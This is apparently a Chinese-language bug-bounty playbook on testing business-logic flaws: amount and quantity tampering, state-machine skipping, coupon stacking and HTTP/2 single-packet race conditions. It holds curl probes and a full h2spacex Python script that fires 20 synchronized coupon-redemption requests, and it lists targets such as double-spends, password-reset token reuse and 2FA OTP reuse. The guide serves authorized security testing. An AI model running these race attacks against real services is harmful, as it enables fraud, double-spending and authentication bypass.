# 品类 3 · 业务逻辑（状态机 / 金额 / 券 / 竞态）

> **为什么独立成类**：传统扫描器**结构上看不见**它 —— 没有"特征"，只有"流程理解错"。
> 这也是企业 SRC 里最不容易被 AI 批量刷掉的一类。
> 来源：OWASP BLA Top-10 · Kettle《Smashing the state machine》· OWASP BLA1:2025 Action Limit Overrun。

## 何时用
- 有**多步流程**：下单→支付→发货 / 申请→审批 / 报名→缴费
- 有**限制**：每人一张券、每天 X 次、一次只能一单
- 有**金额/数量**进请求体
- 有 **`status`/`state`/`step` 字段**

## 探测

```bash
# ① 先测竞态窗口（三条只读命令）
curl -sI --http2 https://T/ -o /dev/null -w '%{http_version}\n'   # 2 = 支持 HTTP/2（单包攻击前提）
curl -s -o /dev/null -w '%{time_total}\n' -X POST https://T/api/redeem -d 'code=X' -H "Cookie: s=S"
curl -sI -X POST https://T/api/transfer -d 'amount=1' -H "Cookie: s=S" | grep -i idempotency
#   处理时间越长窗口越宽；有幂等键 → 竞态多半打不动，换思路

# ② 金额/数量篡改：只读到「被服务端接受」为止，不完成支付
```

## 判据（**状态真的变了**才算）

| 图样 | 具体试 | 判据 |
|---|---|---|
| 负数/零 | 数量 `-1`、金额 `0`、`-0.01` | 退款/积分**反向增加**（余额真的变了） |
| 小数精度 | `0.001` 元、四舍五入差、**币种混淆**（分 vs 元） | 服务端按错误精度入账 |
| **状态机操纵** | 改 `status` 直跳终态（`cancelled`→`confirmed`）；跳步（跳过支付到发货） | **状态真的跳过去了**（回读确认） |
| 叠加 | 多张券叠加 / 券+活动叠加 / 同一券多渠道 | 折扣超出规则 |
| **竞态（限额超发）** | 见下 | **同一资源被成功操作了 N 次**，且有 N 份独立回执 |
| 边界 | 上限值 ±1、超长字符串 | 突破限制 |

## 竞态：单包攻击（最可靠，本机可跑）

**原理**：多个 HTTP/2 请求塞进**同一个 TCP 包** → 消除网络抖动 → 远程竞态像本地一样好打。
**机制核心**：**先发所有 headers，最后一起发"最后一字节"**。

**四种执行方式（按可用性）**：
1. **Burp Repeater**（最快）：复制 10-20 tab → 全选 → 右键 **Send group in parallel (single-packet attack)**
2. **`h2spacex`（本机已装，可脚本化）** —— 完整配方如下（**照抄，别自己推**）：

**★ `h2spacex` 完整配方**（本机已装；**照官方示例抄，别自己推** —— API 有坑：
构造器是 `port_number` 位置参数、`headers_string` 是**字符串**不是 dict、
`create_single_packet_*` 返回的是 **2 元组**）：

```python
from h2spacex import H2OnTlsConnection, h2_frames
from time import sleep

c = H2OnTlsConnection(hostname="TARGET", port_number=443)   # ← port_number
c.setup_connection()

headers = "accept: */*\r\ncontent-type: application/x-www-form-urlencoded\r\ncookie: session=S\r\n"
body    = "code=PROMO123"

all_h, all_d = [], []
for sid in c.generate_stream_ids(number_of_streams=20):      # ← 20 个并发请求
    h_frames, last_data_frame = c.create_single_packet_http2_post_request_frames(
        method="POST", headers_string=headers, scheme="https",      # ← headers_string
        stream_id=sid, authority="TARGET", body=body, path="/api/redeem")
    all_h.append(h_frames)          # 头部帧（不含最后一字节）
    all_d.append(last_data_frame)   # 只含最后一字节的数据帧  ★ 这就是同步点

# ★ 机制核心：先把所有请求的 headers 发出去，再把所有"最后一字节"一起发
#   → 所有请求在同一时刻被服务端处理，彻底消除网络抖动
c.send_frames(b"".join(bytes(x) for x in all_h))   # 1) 全部 headers
sleep(0.1)
c.send_ping_frame()                                 # 2) 预热连接
c.send_frames(b"".join(bytes(x) for x in all_d))   # 3) 全部最后一字节 → 同步点

resp = c.read_response_from_socket(_timeout=3)
fp = h2_frames.FrameParser(h2_connection=c); fp.add_frames(resp)
fp.show_response_of_sent_requests()                 # 看有没有 N 份成功回执
```

**已验证到什么程度（诚实标注）**：
✅ 已验：模块导入 · 构造器签名（`port_number` 位置参数）· 两个 `create_single_packet_http2_*_request_frames`
   返回 **2 元组**（离线构造通过，不发网络）
⚠ **未验**：`setup_connection()` → `send_frames()` → `read_response_from_socket()` → `FrameParser`
   这整条发送/解析链 **需要真实 HTTP/2 目标才能跑通**，本机没有可用目标 → **第一次实战要留时间试错**
来源：`nxenon/h2spacex` wiki Quick-Start-Examples（`work/refs-github/h2wiki-Quick-Start-Examples.md`）。

3. Turbo Intruder：`Engine.BURP2` + 全部 `gate='race1'` → `openGate('race1')`
4. HTTP/1.1 兜底：**last-byte synchronization**（同连接发 N 个，只留最后一字节，最后一起发）

**高价值端点**：券核销 · 余额转账/**双花** · 礼品卡充值 · 点赞投票 · 邀请码复用 ·
**密码重置**（同一 token 并发）· **2FA**（同一 OTP 多会话）· 注册（绕唯一约束）· 限速绕过

**判据**：**两笔入账 / 两个成功响应 / 资源被用两次**。
**无害证法**：**自己账号 + 最小额度（1 分钱 / 1 张券）**，不刷到真实损失。

## 坑
- **别只看「参数被接受」** —— 那只是服务端没报错，不是漏洞
- **金额类只读到「订单被服务端接受」为止，不完成支付**
- 幂等键存在 → 竞态基本没戏，别硬试
- 多租户（换 `tenantId`）已归入**品类 1 访问控制**

## 证据怎么留
```bash
fgs fact-add <pid> "<结论>" --confidence verified --verdict accepted \
    --severity high --proof-kind side_read --target <host>   # 读类
# 写/状态变更类：proof-kind=sentinel（自建哨兵增改删闭环）或 idempotent（幂等回写原值）
```
竞态类必须留：**N 份独立回执**（时间戳 + 各自的响应体），单份响应证明不了竞态。
